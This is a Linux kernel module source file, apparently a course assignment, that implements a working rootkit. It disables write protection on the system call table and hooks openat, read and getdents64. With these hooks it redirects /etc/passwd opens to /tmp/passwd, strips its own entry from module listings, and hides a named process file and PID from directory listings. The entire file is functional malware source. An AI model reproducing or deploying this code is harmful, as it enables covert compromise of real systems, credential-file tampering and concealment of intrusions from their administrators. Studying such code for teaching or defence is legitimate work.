#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <linux/semaphore.h>
#include <linux/dirent.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"

static char * pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "pid");

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);
// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  const char * pathname = (const char *)regs->si;
  if (strcmp(pathname, "/etc/passwd") == 0) {
    copy_to_user((char*)pathname, "/tmp/passwd", strlen("/tmp/passwd") + 1);
  }
  return original_openat(regs);
}


asmlinkage int (*original_read)(struct pt_regs *);
// Define your new sneaky version of the 'read' syscall
asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs)
{
  char* has_sneaky;
  char* end;
  ssize_t ans;
  // Implement the sneaky part here
  void* buf = (void*)regs->si;
  ans = original_read(regs);
  if (ans <= 0) return ans;
  
  has_sneaky = strnstr(buf, "sneaky_mod ", ans);
  if (has_sneaky == NULL) return ans;
  end = strchr(has_sneaky, '\n');
  if (end == NULL) return ans;
  memmove(has_sneaky, (void*)end + 1, ans - ((void*)end + 1 - (void*)buf));
  ans = ans + end + 1 - has_sneaky;
  return ans;
}


asmlinkage int (*original_getdents64)(struct pt_regs *);
// Define your new sneaky version of the 'getdents64' syscall
asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
  // Implement the sneaky part here
  int ans;
  int i;
  struct linux_dirent64 * head = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 * cur = head;
  ans = original_getdents64(regs);
  for (i = 0; i < ans;) {
    if ((strcmp(cur->d_name, "sneaky_process") == 0)||(strcmp(cur->d_name, pid) == 0)){
      char * next = (char*)cur + cur->d_reclen;
      int len = ans - ((void*)next - (void*)head);
      ans -= cur->d_reclen;
      memmove(cur, next, len);
    }
    else {
      i += cur->d_reclen;
      cur = (struct linux_dirent64*)((char*)cur + cur->d_reclen);
    }
  }
  return ans;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  printk(KERN_INFO "pis: %s\n", pid);
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;

  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");